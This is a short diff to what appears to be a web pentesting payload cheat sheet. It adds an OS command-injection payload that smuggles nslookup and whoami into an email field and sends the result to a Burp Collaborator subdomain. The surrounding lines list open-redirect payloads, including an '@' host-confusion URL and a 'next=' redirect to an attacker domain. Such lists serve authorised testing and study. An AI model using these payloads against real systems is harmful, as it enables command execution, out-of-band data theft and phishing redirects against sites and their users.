@@ -178,6 +178,12 @@ Bypass white list validation
 
  
  ----------------------------------------------------------------------------------------------
+                                OS INJECTION
+     email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
+ 
+ 
+ 
+ --------------------------------------------------------------------------------------------------
                                 open redirect
  https://example.com_https@google.com
  https://victim.com/login/?next=https://your_domain.com
